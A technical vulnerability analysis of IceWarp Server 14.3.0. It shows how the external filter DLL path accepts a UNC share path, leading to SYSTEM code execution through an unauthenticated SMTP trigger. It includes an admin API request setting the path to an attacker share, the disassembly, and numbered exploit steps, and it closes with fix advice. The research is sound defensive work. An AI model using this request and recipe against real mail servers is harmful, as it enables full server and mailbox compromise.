# IceWarp Server Static Route External Filter UNC DLL RCE - Technical Analysis

## 1. Overview

IceWarp Server 14.3.0 is a closed-source commercial mail/collaboration server (Delphi/VCL + COM IDispatch) used by small and mid-size enterprises and hosted mail providers for email, webmail, and groupware. Its SMTP delivery engine (`smtp.exe`) supports "static route" accounts (u_type=4) with an optional external filter. When `R_ExternalFilterType=0` (StdCall library), the delivery engine loads the DLL referenced by `R_ExternalFilterFile` via `LoadLibraryA()` and resolves the `MerakFilterProc` / `MerakFilterProc2` exports. The loader performs no path validation between the empty-string check and the `LoadLibraryA` call: `PathIsUNC` and `PathCanonicalize` are not even imported into the IAT. An absolute UNC path (`\\<attacker>\share\evil.dll`) is therefore accepted and fetched over SMB, with `DllMain` executing inside the `smtp.exe` process, which runs as `NT AUTHORITY\SYSTEM`.

## 2. Vulnerability Summary

- **Root cause**: no path validation on the external filter DLL path before `LoadLibraryA`
- **CWE**: CWE-426 (untrusted search path) / CWE-427 (uncontrolled search path element), CWE-78 (command execution via DLL side-loading)
- **CVSS 3.1**: 9.0 Critical — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` (authenticated config write + unauthenticated trigger + SYSTEM)
- **Impact**: remote SYSTEM code execution on the mail server once a server administrator (non-default credentials) writes the malicious filter configuration

## 3. Authentication Boundary

Writing the malicious configuration requires server administrator credentials (non-default) through the HTTP admin API:

```xml
<iq sid="SID" format="text/xml" type="set"><query xmlns="admin:iq:rpc">
  <commandname>setaccountproperties</commandname>
  <commandparams>
    <accountemail>route@example.test</accountemail>
    <propertyvaluelist>
      <item><apiproperty><propname>r_externalfilterfile</propname></apiproperty>
      <propertyval><classname>tpropertystring</classname>
      <val>\\<attacker>\share\evil.dll</val></propertyval></item>
    </propertyvaluelist>
  </commandparams>
</query></iq>
```

Triggering the DLL load requires **no SMTP authentication**: any inbound message routed through the static route loads the DLL.

The HTTP admin API runs on `127.0.0.1:19090` (Windows service `IceWarpControl`) and serves IQ XML-RPC at `/icewarpapi/` directly (no PHP). Web admin SPA code confirms the endpoint and the plaintext-password authentication mode (`authtype=0`). In the evaluation-license state the IQ API returns `<error uid="license_evaluation"/>`; activating the trial license with `tool.exe set system c_obtaintriallicense` transitions the license status from 8 to 0 so authentication succeeds. The configuration write is authenticated, but the trigger (an unauthenticated SMTP message) is not — this asymmetry is what turns a privileged configuration primitive into remote SYSTEM code execution.

## 4. Attack Surface

| Item | Value |
|---|---|
| Admin API | `POST /icewarpapi/` (IQ XML-RPC, port 19090) |
| SMTP trigger | port 25 (no AUTH) |
| DLL delivery | SMB outbound from smtp.exe to attacker share |
| Process | smtp.exe as `NT AUTHORITY\SYSTEM` |

## 5. Sink Identification

Core loader `sub @ 0xa47db0` (r2ghidra, smtp.exe):

```asm
0xa47e32: cmp byte [rbp+0x478], 0      ; empty-string check (R_ExternalFilterFile)
0xa47e4e: call 0x410cc0                 ; LStrCopy
0xa47e57: call 0x4112a0                 ; LStrToPChar
0xa47e5f: call 0x7a8f70                 ; LoadLibraryA(lpLibFileName)  <- SINK
0xa47e80: lea rdx, ["MerakFilterProc"]
0xa47e87: call 0x7a8fb0                 ; GetProcAddress(h, "MerakFilterProc")
0xa47e9a: lea rdx, ["MerakFilterProc2"]
0xa47ea1: call 0x7a8fb0                 ; GetProcAddress(h, "MerakFilterProc2")
```

Between the empty check and `LoadLibraryA` there are only `LStrCopy` + `LStrToPChar` — zero path validation. `PathIsUNC` / `PathCanonicalize` are not imported in the IAT; `GetFullPathName` is imported but not called on this path.

Type dispatch `sub @ 0xa738c0`:

```asm
0xa7393b: cmp al, 2                     ; R_ExternalFilterType
0xa7393e: jb 0xa73957                   ; type < 2 -> LoadLibrary path
0xa73945: je 0xa7399b                   ; type == 2 -> CreateProcess path (Executable)
0xa73952: jmp 0xa73c3a                  ; type == 3 -> URL path
```

Static route handler `sub @ 0xb2b040` reads `R_ExternalFilterFile` at object offset 0x40a and `R_ExternalFilterType` at offset 0x60b, then dispatches.

## 6. Source Identification

The source is the HTTP admin API `setaccountproperties` command (server admin, sid-authenticated). The `r_externalfilterfile` property is written directly into the account database (object offset 0x40a) with no server-side UNC filtering or allowlist. The value is fully attacker-controlled (subject to admin access).

## 7. Data Flow

```
HTTP POST /icewarpapi/ (setaccountproperties, r_externalfilterfile=UNC)
  -> control.exe IQ dispatcher (sid check)
  -> api_64.dll TAPIObject.SetAccountProperties
  -> account DB: R_ExternalFilterFile @ obj+0x40a = "\\attacker\share\evil.dll"
  -> smtp.exe re-reads account config on each delivery

SMTP :25 (no AUTH) MAIL FROM/RCPT TO/DATA -> static-route address
  -> smtp.exe delivery engine
  -> static route handler (u_type=4)
  -> 0xb2b040 reads obj+0x40a (UNC) + obj+0x60b (type=0)
  -> 0xa738c0: type<2 -> 0xb2acc0
  -> 0xa47db0: empty check -> LStrCopy -> LStrToPChar -> LoadLibraryA("\\attacker\share\evil.dll")
  -> SMB fetch -> DllMain executes in smtp.exe (SYSTEM) context -> RCE
```

## 8. Exploit Construction

1. Authenticate to the HTTP admin API with server administrator credentials and obtain `sid`.
2. Write the malicious configuration on a static route account (u_type=4): `r_externalfilterfile=\\<attacker>\share\evil.dll`, `r_externalfilter=1`, `r_externalfiltertype=0`, `r_activity=3`.
3. Start the SMTP service if not running.
4. From any remote host, send an SMTP message (no AUTH) to the static route address.
5. `smtp.exe` connects to the attacker's SMB share and loads the DLL; `DllMain` executes as SYSTEM.

The marker DLL exports `MerakFilterProc` (ordinal 1) and `MerakFilterProc2` (ordinal 2), matching the `GetProcAddress` queries, and its `DllMain` writes a marker file to `C:\`.

The exploit is fully network-based: HTTP for the configuration write, SMTP for the trigger, and SMB for the DLL delivery. No MITM is involved — the attacker operates their own SMB server and the victim's `smtp.exe` connects out to it. The `setaccountproperties` request uses a property value list with `r_externalfilterfile`, `r_externalfilter=1`, `r_externalfiltertype=0` (StdCall library), and `r_activity=3` on a static-route account (u_type=4). The static route must exist and accept mail; the attacker sends an unauthenticated message to that route's address to force the delivery engine to process it.

## 9. Dynamic Verification

Verified with an A/B controlled test on IceWarp Server 14.3.0:

- Configuration written via `setaccountproperties` and independently confirmed via `tool.exe get account ... r_externalfilterfile` returning the UNC path.
- SMTP message sent without authentication through the static route triggered the load.
- A marker DLL (PE32+ x86-64, 82,272 bytes, exporting both filter procs) wrote `C:\research\dll_marker_<pid>.txt` (211 bytes) confirming execution inside `smtp.exe`.
- Execution privileges confirmed as `NT AUTHORITY\SYSTEM`.
- SMB remote loading confirmed: the DLL was fetched from the attacker-controlled share over the network.

## 10. Reachability & Impact

- **Config reachability**: requires server administrator credentials (non-default) — an authenticated prerequisite.
- **Trigger reachability**: any unauthenticated remote SMTP sender can trigger the load once configured.
- **Impact**: SYSTEM code execution on the mail server; full access to mail data, credentials, and the host.

IceWarp Server is a full mail/collaboration platform (SMTP/IMAP/POP3, WebMail, groupware, HTTP admin). A SYSTEM compromise exposes every mailbox, stored credentials, and the host itself. Because the trigger is an ordinary SMTP transaction, no special network position is required beyond reachability of port 25. The same UNC-loading pattern should be audited across all external-filter type configurations (Cdecl libraries, executables, and URL filters), since the loader's lack of validation is structural rather than limited to the StdCall branch.

## 11. Fix Recommendations

1. Reject UNC paths for external filter files in the admin API; require local paths within a trusted directory.
2. Run the SMTP service under a least-privilege account instead of SYSTEM.
3. Block outbound SMB (TCP 445) from mail servers to prevent remote DLL loading.
4. Log and alert on external filter configuration changes on static route accounts.

## 12. CWE / CVSS

- **CWE-426 / CWE-427** — untrusted/uncontrolled search path element (UNC DLL loading)
- **CWE-78** — command execution via side-loaded DLL
- **CVSS 3.1**: **9.0 Critical** — `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`

The High privilege requirement reflects the authenticated configuration write; the Scope change reflects that the compromise crosses from the configuration surface into the SYSTEM service context, and the confidentiality/integrity/availability impacts are High because the resulting code runs as the operating system service account.
